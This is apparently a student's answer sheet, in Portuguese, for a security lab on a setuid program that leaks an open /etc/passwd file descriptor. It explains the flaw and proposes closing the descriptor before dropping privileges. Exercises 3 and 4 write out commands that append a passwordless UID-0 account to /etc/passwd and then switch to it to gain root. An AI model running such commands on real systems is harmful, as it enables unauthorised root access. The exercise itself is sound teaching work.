# Exercico 1
./passwdleak
# Passwd FD leaked: 3


# Exercicio 2
#o programa abre o /etc/passwd e não fecha o FD antes de largar os privilegios, assim quando muda para um utilizador comum
#o FD ainda está aberto e o utilizador comum tem acesso a ele


# Exercicio 3
printf "ssihacker::0:0::/root:/bin/sh\n" >&3
tail -n 1 /etc/passwd
# ssihacker::0:0::/root:/bin/sh


# Exercicio 4
su ssihacker
# entrei numa nova shell sem necessitar de fornecer uma password
whoami
# root
# ganhei root access através de uma vulnerabilidade de segurança


# Exercicio 5
# para corrigir o programa precisamos de fechar o FD antes de largar os privilegios
# // ... código anterior
# if (fd < 0) {
#     perror("open /etc/passwd");
#     exit(1);
# }

# // CORREÇÃO: Fechar o descritor de ficheiro assim que já não é necessário
# close(fd); 


# setuid(getuid());
# execl("/bin/sh", "sh", NULL);
